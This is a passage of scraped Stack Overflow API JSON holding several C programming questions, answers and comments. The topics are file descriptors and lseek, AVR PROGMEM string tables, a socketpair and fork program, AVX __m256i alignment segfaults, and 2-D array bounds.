~(!((n8) &amp; overFlowMask) - 1));\nmaskBits = maskBits | ((maskBits &lt;&lt; (n16)) &amp; ~(!((n16) &amp; overFlowMask) - 1));\n\nreturn (maskBits &amp; ~nMax) | (x &amp; nMax);\n}\n</code></pre>\n\n<p>Would implementing <code>unsigned</code> data in some capacity help ?</p>\n"}, {"tags": ["c", "file-io", "io", "posix"], "comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1476245319, "post_id": 39990253, "comment_id": 67259140, "body": "Also, be careful which stream you <code>lseek</code> on. See the NOTE in <code>man 2 lseek</code>, <i>&quot;Some devices are incapable of seeking and POSIX does not specify which devices must support lseek().&quot;</i>."}], "answers": [{"comments": [{"owner": {"reputation": 1243, "user_id": 1487773, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/gnHdG.png?s=128&g=1", "display_name": "Igor Liferenko", "link": "https://stackoverflow.com/users/1487773/igor-liferenko"}, "edited": false, "score": 0, "creation_date": 1476249426, "post_id": 39990325, "comment_id": 67260220, "body": "Indeed, my real intent was to use &quot;fd2&quot; in &quot;fileno&quot; and &quot;write&quot; lines. Now everything works."}], "tags": [], "owner": {"reputation": 16507, "user_id": 4787126, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a822df86c907c77c792a8f91b2bab41?s=128&d=identicon&r=PG&f=1", "display_name": "Zbynek Vyskovsky - kvr000", "link": "https://stackoverflow.com/users/4787126/zbynek-vyskovsky-kvr000"}, "is_accepted": true, "score": 1, "last_activity_date": 1476249317, "last_edit_date": 1476249317, "creation_date": 1476245034, "answer_id": 39990325, "question_id": 39990253, "link": "https://stackoverflow.com/questions/39990253/why-read-on-file-descriptor-fails-if-lseek-is-used/39990325#39990325", "title": "Why read() on file descriptor fails if lseek() is used?", "body": "<p>There is no check on return values from the functions. If it had been there you would have found the error.</p>\n\n<p>Anyway, the issue is:</p>\n\n<pre><code>  fd = fileno(stderr);     // getting the fd from current stderr\n  fclose (stderr);         // closing stderr\n  ...\n  lseek (fd, 0, SEEK_SET); // seeking on fd which was already closed\n</code></pre>\n\n<p>In the last call and subsequent calls <code>fd</code> is actually undefined (or rather it references closed file descriptor). Therefore any operation on <code>fd</code> will fail <code>EBADF</code> (not valid file descriptor).</p>\n\n<p>Obviously if you include the <code>fd = open(...)</code> again, <code>fd</code> will become valid and the code will work.</p>\n"}], "owner": {"reputation": 1243, "user_id": 1487773, "user_type": "registered", "accept_rate": 76, "profile_image": "https://i.stack.imgur.com/gnHdG.png?s=128&g=1", "display_name": "Igor Liferenko", "link": "https://stackoverflow.com/users/1487773/igor-liferenko"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 494, "favorite_count": 0, "accepted_answer_id": 39990325, "answer_count": 1, "score": 0, "last_activity_date": 1476249317, "creation_date": 1476244474, "question_id": 39990253, "link": "https://stackoverflow.com/questions/39990253/why-read-on-file-descriptor-fails-if-lseek-is-used", "title": "Why read() on file descriptor fails if lseek() is used?", "body": "<p>In the following example we close default <code>stderr</code> and reopen it on the temporary file via <code>fdopen()</code>, using descriptor <code>2</code>, which was <code>dup()</code>'ed from the temporary file descriptor. Then we <code>write()</code> directly to this descriptor <code>2</code>. We can safely do this, because the is the first write operation on file and thus it has the empty buffer. After this, we <code>fprintf()</code> to the new <code>stderr</code>. Then we close <code>stderr</code> (thus, its associated descriptor <code>2</code> is automatically closed). Original descriptor <code>fd</code> remains valid. Through it we go to the beginning of the temporary file, read its contents and print them to stdout. But the output is garbled:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;fcntl.h&gt;\n\nint main(void)\n{\n  int fd;\n  char buf[200];\n  int n;\n  char fname[] = \"/tmp/tst-perror.XXXXXX\";\n  fd = mkstemp (fname);\n  fclose (stderr);\n  dup2 (fd, 2);\n  stderr = fdopen (2, \"w\");\n  fd = fileno(stderr);\n  char *s = \"this is a test\\n\";\n  n = write(fd, s, strlen(s));\n  fprintf(stderr, \"multibyte string\\n\");\n  fclose (stderr);\n//  close(fd);\n//  fd = open(fname, O_RDONLY);\n  lseek (fd, 0, SEEK_SET);\n  n = read (fd, buf, sizeof (buf));\n  printf(\"%.*s\", (int) n, buf);\n  close (fd);\n  return 0;\n}\n</code></pre>\n\n<p>The output is:</p>\n\n<pre><code>$ ./a.out\n\ufffd\ufffd\ufffd\ufffd\n</code></pre>\n\n<p>If we uncomment the \"close\" and \"open\" lines and comment \"lseek\" line, the output is as expected:</p>\n\n<pre><code>$ ./a.out\nthis is a test\nmultibyte string\n</code></pre>\n\n<p><code>write()</code> does not have a buffer, and <code>stderr</code> is written-off when it is closed, so\nwhy the output is garbled if we do not close the file before reading it?</p>\n"}, {"tags": ["c", "embedded", "atmel", "atmelstudio"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1476244438, "post_id": 39990163, "comment_id": 67258906, "body": "So, what is <code>PGM_P</code>?"}, {"owner": {"reputation": 3699, "user_id": 474173, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/18331a42eeb0683a21fe3af6722c04cc?s=128&d=identicon&r=PG", "display_name": "Swanand", "link": "https://stackoverflow.com/users/474173/swanand"}, "edited": false, "score": 1, "creation_date": 1476244480, "post_id": 39990163, "comment_id": 67258922, "body": "Problem is with variable <code>string_table</code>. Declare it as Const. also, you have not initialized <code>int i</code>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 3699, "user_id": 474173, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/18331a42eeb0683a21fe3af6722c04cc?s=128&d=identicon&r=PG", "display_name": "Swanand", "link": "https://stackoverflow.com/users/474173/swanand"}, "edited": false, "score": 0, "creation_date": 1476244533, "post_id": 39990163, "comment_id": 67258932, "body": "@Swanand: Without a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>, this is not possible to answer."}, {"owner": {"reputation": 26723, "user_id": 995714, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/w1393.jpg?s=128&g=1", "display_name": "phuclv", "link": "https://stackoverflow.com/users/995714/phuclv"}, "edited": false, "score": 0, "creation_date": 1476244547, "post_id": 39990163, "comment_id": 67258937, "body": "declare <code>string_table</code> as const as the error message says"}, {"owner": {"reputation": 73, "user_id": 7004331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e32861bfeeee4e87abfa4b603b6905e8?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff G", "link": "https://stackoverflow.com/users/7004331/jeff-g"}, "edited": false, "score": 0, "creation_date": 1476245233, "post_id": 39990163, "comment_id": 67259112, "body": "@Swanland: I actually came up with this solution BEFORE I saw your post, I swear...  and thank you still."}, {"owner": {"reputation": 73, "user_id": 7004331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e32861bfeeee4e87abfa4b603b6905e8?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff G", "link": "https://stackoverflow.com/users/7004331/jeff-g"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476245344, "post_id": 39990163, "comment_id": 67259145, "body": "@Olaf: PGM_P is a macro that is inside &lt;avr/pgmspace.h&gt; which is used as: #include &lt;avr/pgmspace.h&gt;"}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1476264248, "post_id": 39990163, "comment_id": 67267839, "body": "The <i>IDE</i> &quot;Atmel Studio 7&quot; does not define what <i>compiler</i> you are using - that information may be critical to a correct answer."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1476278713, "post_id": 39990163, "comment_id": 67277259, "body": "@JeffG: That does give exactly no new information."}], "answers": [{"comments": [{"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1476264341, "post_id": 39990326, "comment_id": 67267910, "body": "So you dis exactly what the error message was telling you you needed to do!?"}], "tags": [], "owner": {"reputation": 73, "user_id": 7004331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e32861bfeeee4e87abfa4b603b6905e8?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff G", "link": "https://stackoverflow.com/users/7004331/jeff-g"}, "is_accepted": false, "score": 0, "last_activity_date": 1476245050, "creation_date": 1476245050, "answer_id": 39990326, "question_id": 39990163, "link": "https://stackoverflow.com/questions/39990163/how-to-store-constants-in-rom-atmel/39990326#39990326", "title": "How to store constants in ROM (Atmel)", "body": "<p>after fussing with this all day and many trial and error attempts, I came up with the following:  </p>\n\n<p>Change the line</p>\n\n<pre><code>`PGM_P string_table[5] PROGMEM =`\n</code></pre>\n\n<p>to </p>\n\n<pre><code>`PGM_P const string_table[5] PROGMEM =`\n</code></pre>\n\n<p>That seems to compile and I can display the contents of the string \"buffer\" on the display (\"String 1\" is actually what is sent to the display).  I hope this will help others that have had similar issues getting constants in and out of ROM.</p>\n"}], "owner": {"reputation": 73, "user_id": 7004331, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e32861bfeeee4e87abfa4b603b6905e8?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff G", "link": "https://stackoverflow.com/users/7004331/jeff-g"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 857, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1476262391, "creation_date": 1476243751, "last_edit_date": 1476262391, "question_id": 39990163, "link": "https://stackoverflow.com/questions/39990163/how-to-store-constants-in-rom-atmel", "title": "How to store constants in ROM (Atmel)", "body": "<p>Good Day,</p>\n\n<p>I am writing firmware for an ATMega645A using AtmelStudio 7.  I am starting a localization project and need to display messages on a 16x2 character display in 3 different languages.  The existing (English messages) are stored in SRAM, but I will end up overflowing this data memory space if I have to triple the number of messages.</p>\n\n<p>SO, I am trying to store the messages in ROM where space is a-plenty.  Problem is, Atmel app notes are either (a) wrong or (b) incomplete because I have tried multiple methods per their suggestion and the code does not compile (ref: Atmel Tips &amp; Tricks App Note doc8453.pdf page 8, and <a href=\"http://www.atmel.com/webdoc/AVRLibcReferenceManual/FAQ_1faq_rom_array.html\" rel=\"nofollow\">http://www.atmel.com/webdoc/AVRLibcReferenceManual/FAQ_1faq_rom_array.html</a>).  My code looks like this:</p>\n\n<pre><code>// before main(void)\n#include &lt;avr/pgmspace.h&gt;\nconst char string_1[] PROGMEM = \"String 1\";\nconst char string_2[] PROGMEM = \"String 2\";\nconst char string_3[] PROGMEM = \"String 3\";\nconst char string_4[] PROGMEM = \"String 4\";\nconst char string_5[] PROGMEM = \"String 5\";\n\nPGM_P string_table[5] PROGMEM =\n{\n  string_1,\n  string_2,\n  string_3,\n  string_4,\n  string_5\n};\n</code></pre>\n\n<p>inside main(void) I have the following:</p>\n\n<pre><code>char buffer[10];\nPGM_P p;\nint i;\n\nmemcpy_P(&amp;p, &amp;string_table[i], sizeof(PGM_P));\nstrcpy_P(buffer, p);\n</code></pre>\n\n<p>When compiling, I get a message:\nvariable 'string_table' must be const in order to be put into read-only section by means of '<em>attribute</em>((progmem))'</p>\n\n<p>I have tried 'char' instead of 'const char', but nothing seems to compile.  Any advice on the proper syntax to get these static character strings to be stored in ROM would be greatly appreciated.</p>\n"}, {"tags": ["c", "sockets", "fork", "toupper"], "comments": [{"owner": {"reputation": 17580, "user_id": 493106, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/48b0c7ab491edf2f69e63773181a22b5?s=128&d=identicon&r=PG", "display_name": "xaxxon", "link": "https://stackoverflow.com/users/493106/xaxxon"}, "edited": false, "score": 0, "creation_date": 1476243866, "post_id": 39990123, "comment_id": 67258762, "body": "pretty sure the newline gets left on the end of stdin and it keeps getting read over and over as a terminator for the line.   You have to do some sort of ignore command on it or something.  It&#39;s a pretty common question.  Search for &quot;stdin newline ignore&quot; without the quotes."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user5447431"}, "edited": false, "score": 0, "creation_date": 1476254512, "post_id": 39991428, "comment_id": 67262074, "body": "Thank you. Oversight on my part"}], "tags": [], "owner": {"reputation": 56858, "user_id": 131930, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/91536fe27d32713b8a154a0bf42f6748?s=128&d=identicon&r=PG", "display_name": "Jeremy Friesner", "link": "https://stackoverflow.com/users/131930/jeremy-friesner"}, "is_accepted": true, "score": 1, "last_activity_date": 1476252284, "last_edit_date": 1476252284, "creation_date": 1476251846, "answer_id": 39991428, "question_id": 39990123, "link": "https://stackoverflow.com/questions/39990123/socketpair-is-only-printing-the-first-line-from-stdin/39991428#39991428", "title": "Socketpair is only printing the first line from stdin", "body": "<blockquote>\n  <p>My program prints the first line from stdin capitalized, but then it\n  hangs. I have to ctrl-c to exit. How do i get the sockets to loop thru\n  until EOF printing the modified lines?</p>\n</blockquote>\n\n<p>Your child process's routine (i.e. the one that does the toupper() calls) only calls read() one time, and then calls write() one time, and then exits.  That is why only one line is processed.  To get it to do multiple lines, you'd need to put the code into a loop:</p>\n\n<pre><code>[...]\n  else{\n    while(read(socket[0], buffer, bufferSize) &gt; 0)\n    {\n       for(j = 0; j[buffer];j++){\n         buffer[j] = toupper(buffer[j]);\n       }\n       write(socket[0], buffer, bufferSize);\n    }\n  }\n  return 0;\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5447431"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 98, "favorite_count": 0, "accepted_answer_id": 39991428, "answer_count": 1, "score": 0, "last_activity_date": 1476252284, "creation_date": 1476243509, "question_id": 39990123, "link": "https://stackoverflow.com/questions/39990123/socketpair-is-only-printing-the-first-line-from-stdin", "title": "Socketpair is only printing the first line from stdin", "body": "<p>I am doing a simple project in C involving <code>fork()</code> and <code>socketpairs</code>. The program forks a process then creates a socketpair for the processes to talk to one another. The parent process reads lines from stdin one at a time until EOF, and then sends the lines one by one the the child. The child converts the lines to uppercase and sends them back to the parent, who sends them to stdout. Here is my code</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n\nint main(int argc, char *argv[]) {\n  /* code */\n  int returnCode, status, socket[2], j;\n  char* buffer;\n  size_t bufferSize = 100;\n  size_t line;\n\n  buffer = (char *)malloc(bufferSize * sizeof(char));\n  socketpair(AF_UNIX, SOCK_STREAM, 0, socket);\n\n  returnCode = fork();\n  if(returnCode == -1){\n    printf(\"Fork failed\\n\");\n  }\n  if(returnCode &gt; 0){\n    while(getline(&amp;buffer, &amp;bufferSize, stdin) != -1){\n      write(socket[1], buffer, bufferSize);\n      read(socket[1], buffer, bufferSize);\n      printf(\"%s\", buffer);\n    }\n  }\n  else{\n    read (socket[0], buffer, bufferSize);\n    for(j = 0; j[buffer];j++){\n      buffer[j] = toupper(buffer[j]);\n    }\n    write(socket[0], buffer, bufferSize);\n  }\n  return 0;\n}\n</code></pre>\n\n<p>My program prints the first line from stdin capitalized, but then it hangs. I have to ctrl-c to exit. How do i get the sockets to loop thru until EOF printing the modified lines?</p>\n"}, {"tags": ["c", "ubuntu", "gcc", "x86", "avx"], "comments": [{"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 2, "creation_date": 1476245415, "post_id": 39990069, "comment_id": 67259166, "body": "malloc doesn&#39;t guarantee 32B-aligned memory."}], "answers": [{"comments": [{"owner": {"reputation": 71, "user_id": 7005200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d935338bb731a0f2ba72f90b0830ff9?s=128&d=identicon&r=PG&f=1", "display_name": "Ruiyu Zhu", "link": "https://stackoverflow.com/users/7005200/ruiyu-zhu"}, "edited": false, "score": 0, "creation_date": 1476376369, "post_id": 39990958, "comment_id": 67330151, "body": "I am pretty sure that the code ALWAYS run properly on my Mac. It looks like  this is contradict your theory. According to your theory, It should also give a Segfault since it gives 16 byte alignment but not 32 byte alignment."}, {"owner": {"reputation": 1026, "user_id": 3516034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e02345f48d216d62ed48273f632d7478?s=128&d=identicon&r=PG&f=1", "display_name": "Phil", "link": "https://stackoverflow.com/users/3516034/phil"}, "reply_to_user": {"reputation": 71, "user_id": 7005200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d935338bb731a0f2ba72f90b0830ff9?s=128&d=identicon&r=PG&f=1", "display_name": "Ruiyu Zhu", "link": "https://stackoverflow.com/users/7005200/ruiyu-zhu"}, "edited": false, "score": 0, "creation_date": 1476382495, "post_id": 39990958, "comment_id": 67333481, "body": "It is more complicated than that. As I explain in the &quot;instruction differences&quot; section, gcc on your OSX is generating assembly instructions that only require <i>16 byte</i> alignment _even though the C datatype <code>__m256i</code> requires 32 byte alignment. This is why it is working on your Mac - the resulting binary only needs 16 byte alignment, not 32 byte. The Ubuntu build generates instructions that require 32 byte alignment."}, {"owner": {"reputation": 71, "user_id": 7005200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d935338bb731a0f2ba72f90b0830ff9?s=128&d=identicon&r=PG&f=1", "display_name": "Ruiyu Zhu", "link": "https://stackoverflow.com/users/7005200/ruiyu-zhu"}, "edited": false, "score": 0, "creation_date": 1476487208, "post_id": 39990958, "comment_id": 67382500, "body": "That explains everything. Thanks!"}], "tags": [], "owner": {"reputation": 1026, "user_id": 3516034, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e02345f48d216d62ed48273f632d7478?s=128&d=identicon&r=PG&f=1", "display_name": "Phil", "link": "https://stackoverflow.com/users/3516034/phil"}, "is_accepted": false, "score": 4, "last_activity_date": 1476395431, "last_edit_date": 1495535550, "creation_date": 1476249318, "answer_id": 39990958, "question_id": 39990069, "link": "https://stackoverflow.com/questions/39990069/allocating-memory-for-m256i/39990958#39990958", "title": "Allocating memory for __m256i", "body": "<h2>Alignment, Malloc Behavior, and Stack allocations</h2>\n\n<p>@Peter Cordes's comment addresses part of the problem.</p>\n\n<p>Specifically on your OSX machine you are \"always\" getting correctly aligned memory which meets the alignment needs for the assembly generated for the <code>__m256i</code> datatype, which is <a href=\"https://software.intel.com/en-us/node/524040\" rel=\"nofollow noreferrer\">supposed to be 32 byte aligned</a>. (I put \"always\" in quotations because it isn't guaranteed with <code>malloc</code>.  You may have just gotten lucky with OSX's <code>malloc</code>.  Multiple runs of the same code tend to get the same alignments, unlike repeated calls to <code>malloc</code> inside one program.  Actually, see below: the compiler on OS X generates different asm)</p>\n\n<p>On Ubuntu, you are not getting a suitable alignment in the memory address returned by <code>malloc</code>. (See below for details on why.)</p>\n\n<p>You call your second code snippet a <code>slight change</code>.</p>\n\n<pre><code>int main()\n{\n    struct Box result[1];\n    (*result).L=(*result).L;\n}\n</code></pre>\n\n<p>It is actually quite substantially different from the first snippet which uses <code>malloc</code> because the the complier (gcc here) is aware of the alignment requirements of the data type <code>Box</code> (and by extension <code>__m256i</code> also) when allocating the memory on the stack. Thus there is no risk of segfaulting in this case because the complier provides the correct alignment. </p>\n\n<p>You can manipulate the base pointer returned by <code>malloc</code> as explained in this post <a href=\"https://stackoverflow.com/a/227900/3516034\">https://stackoverflow.com/a/227900/3516034</a>. I'll let you look there for the details but in short you can do something like</p>\n\n<pre><code>struct Box *result=NULL;\nvoid *mem = malloc(2 * sizeof(struct Box));\nresult = (struct Box *)((uintptr_t)mem + offset);\n</code></pre>\n\n<p>where <code>offset</code> allows you to explore the alignment and segfaults. It may be useful for you to print out the pointer address you end up using for <code>result</code> like <code>printf(\"0x%08\" PRIXPTR \"\\n\", (uintptr_t)result);</code> (again from that post).</p>\n\n<h2>Instruction Differences</h2>\n\n<p>Lastly, I can reproduce this on Ubuntu and OSX. I actually see my OSX <code>malloc</code> calls giving <em>16 byte</em> alignment and not 32 byte alignment. I <em>also</em> see 16 byte alignment on Ubuntu (in a VM on the same hardware) which <em>is</em> causing the segfault. When I manually align to 32 bytes, the segfault goes away. </p>\n\n<p>So the root cause of your problem is that the systems are not generating the same assembly instructions.  I got the assembly with the <code>-S</code> option to gcc.  On OSX, I see <code>vmovaps</code> used 4 times with XMM operands, and on Ubuntu <code>vmovdqa</code> twice with YMM operands, to move a <code>__m256i</code>.</p>\n\n<p><a href=\"http://www.felixcloutier.com/x86/MOVDQA.html\" rel=\"nofollow noreferrer\"><code>vmovdqa</code></a> and <a href=\"http://www.felixcloutier.com/x86/MOVAPS.html\" rel=\"nofollow noreferrer\"><code>vmovaps</code></a> require their memory operands to be naturally-aligned (i.e. 32B for YMM, 16B for XMM).  So the assembly generated on OSX only requires 16B alignment even though <code>__m256i</code> is 32B.</p>\n"}], "owner": {"reputation": 71, "user_id": 7005200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3d935338bb731a0f2ba72f90b0830ff9?s=128&d=identicon&r=PG&f=1", "display_name": "Ruiyu Zhu", "link": "https://stackoverflow.com/users/7005200/ruiyu-zhu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 536, "favorite_count": 0, "closed_date": 1476276702, "answer_count": 1, "score": 3, "last_activity_date": 1476395431, "creation_date": 1476243125, "last_edit_date": 1476248604, "question_id": 39990069, "link": "https://stackoverflow.com/questions/39990069/allocating-memory-for-m256i", "closed_reason": "Duplicate", "title": "Allocating memory for __m256i", "body": "<p>I've encountered such a mysterious Segmentation fault.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;immintrin.h&gt;\nstruct Box{\n    __m256i L;\n};\nint main()\n{\n    struct Box *result=NULL;\n    result=(struct Box *)malloc(sizeof(struct Box));\n    (*result).L=(*result).L;\n}\n</code></pre>\n\n<p>Compiled with flags <code>-msse4.2 -march=corei7-avx</code></p>\n\n<p>It runs totally fine on my Mac (OS X EI Caption 10.11.6, GCC 4.8.4).\nBut it gives me Segmentation fault on Amazon EC2 machine (Ubuntu 14.04, GCC 4.8.4).</p>\n\n<p>When I make a slight change:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;immintrin.h&gt;\nstruct Box{\n    __m256i L;\n};\nint main()\n{\n    struct Box result[1];\n    (*result).L=(*result).L;\n}\n</code></pre>\n\n<p>It will be able to run on the Ubuntu machine.</p>\n\n<p>Does anyone have any explanation about this?</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 1233, "user_id": 5366130, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ce3d4bd07d1115070e7727de382560ba?s=128&d=identicon&r=PG&f=1", "display_name": "Omid CompSCI", "link": "https://stackoverflow.com/users/5366130/omid-compsci"}, "edited": false, "score": 0, "creation_date": 1476242137, "post_id": 39989927, "comment_id": 67258400, "body": "Isn&#39;t 2D array the 2nd field must be declared even if the first isnt?"}], "answers": [{"comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1476242236, "post_id": 39989944, "comment_id": 67258419, "body": "well, it could work out the size of the arrays from the initializer in this case. Just the language spec happens to say that it shouldn&#39;t do that."}, {"owner": {"reputation": 538, "user_id": 6446925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002a024a3b131e11d71666a47875cc2f?s=128&d=identicon&r=PG&f=1", "display_name": "MarcD", "link": "https://stackoverflow.com/users/6446925/marcd"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1476242288, "post_id": 39989944, "comment_id": 67258427, "body": "In this case, yes, but in most cases no. Try six elements. Is it [2][3], or [3][2]?"}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 3, "creation_date": 1476242330, "post_id": 39989944, "comment_id": 67258436, "body": "If they&#39;re braced as in the OP, there&#39;s no ambiguity"}, {"owner": {"reputation": 2861, "user_id": 1008115, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/Nmtel.jpg?s=128&g=1", "display_name": "PnotNP", "link": "https://stackoverflow.com/users/1008115/pnotnp"}, "edited": false, "score": 0, "creation_date": 1476242624, "post_id": 39989944, "comment_id": 67258511, "body": "@MarcD I know that I&#39;m required to add size but my question is what is the reason? Is it language requirement? If yes then why?"}, {"owner": {"reputation": 538, "user_id": 6446925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002a024a3b131e11d71666a47875cc2f?s=128&d=identicon&r=PG&f=1", "display_name": "MarcD", "link": "https://stackoverflow.com/users/6446925/marcd"}, "edited": false, "score": 0, "creation_date": 1476243601, "post_id": 39989944, "comment_id": 67258700, "body": "The compiler adds an element to the left of the array in memory that specifies the number of elements. This is for destruction purposes, especially for user defined types that have a destructor. It has to know how many times to call the destructor when the array is destroyed. While you don&#39;t have to specify the size of an array, the size of the elements does need to be known, hence the reason for the [][2]. It&#39;s really an array of arrays of size 2."}, {"owner": {"reputation": 13762, "user_id": 694733, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/0a3de8cd40d9ffb86cc1fed0c8cf2e19?s=128&d=identicon&r=PG", "display_name": "user694733", "link": "https://stackoverflow.com/users/694733/user694733"}, "reply_to_user": {"reputation": 2861, "user_id": 1008115, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/Nmtel.jpg?s=128&g=1", "display_name": "PnotNP", "link": "https://stackoverflow.com/users/1008115/pnotnp"}, "edited": false, "score": 0, "creation_date": 1476255890, "post_id": 39989944, "comment_id": 67262833, "body": "@NulledPointer I think that the reason is they wanted to keep compiler simple in the old times. It could have been added in the later standards, but no-one has really needed or cared about the feature enough to implement it."}], "tags": [], "owner": {"reputation": 538, "user_id": 6446925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/002a024a3b131e11d71666a47875cc2f?s=128&d=identicon&r=PG&f=1", "display_name": "MarcD", "link": "https://stackoverflow.com/users/6446925/marcd"}, "is_accepted": false, "score": 2, "last_activity_date": 1476244420, "last_edit_date": 1476244420, "creation_date": 1476242127, "answer_id": 39989944, "question_id": 39989927, "link": "https://stackoverflow.com/questions/39989927/2-d-array-with-both-bounds-not-specified/39989944#39989944", "title": "2-D array with both bounds not specified", "body": "<p>Only one index can autosize. Otherwise you could have any pair of factors in the size. So <code>a[][2]</code> works, but <code>a[][]</code> does not, because it can't guess the size of the array of arrays.</p>\n"}, {"tags": [], "owner": {"reputation": 105028, "user_id": 134554, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/1894f68e0b15fd3d5b27bfcb021fa11c?s=128&d=identicon&r=PG", "display_name": "John Bode", "link": "https://stackoverflow.com/users/134554/john-bode"}, "is_accepted": true, "score": 1, "last_activity_date": 1476278580, "creation_date": 1476278580, "answer_id": 39999771, "question_id": 39989927, "link": "https://stackoverflow.com/questions/39989927/2-d-array-with-both-bounds-not-specified/39999771#39999771", "title": "2-D array with both bounds not specified", "body": "<p>Here's the problem:</p>\n\n<blockquote>\n<strong>6.2.5 Types</strong><br>\n...<br>\nAn <em>array type</em> describes a contiguously allocated nonempty set of objects with a particular member object type, called the <em>element type</em>. <strong>The element type shall be complete whenever the array type is specified</strong>. Array types are characterized by their element type and by the number of elements in the array. An array type is said to be derived from its element type, and if its element type is <em>T</em>, the array type 